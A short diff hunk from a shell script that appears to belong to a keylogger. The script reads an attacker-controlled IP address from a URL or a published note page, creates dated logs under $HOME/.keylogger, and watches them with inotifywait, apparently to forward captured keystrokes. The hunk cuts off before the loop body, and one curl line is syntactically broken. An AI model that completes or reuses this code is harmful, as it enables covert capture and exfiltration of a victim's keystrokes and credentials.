@@ -61,7 +61,7 @@ if [ -f $IPRAW ];
 else
 	ipaddr=curl $(cat '$IPURLFILE') 2>&1 | grep -o - P '\d+\.\d+\.\d\.\d'
 fi
-#ipaddr=$(curl https://app.simplenote.com/publish/lSr4dF 2>&1 | grep -o 192\.168\.2\..*)
+
 touch $HOME/.keylogger/$(date +"%d:%m:%Y.log")
 while inotifywait -q -e modify $HOME/.keylogger/$(date +"%d:%m:%Y.log") >/dev/null; do
     
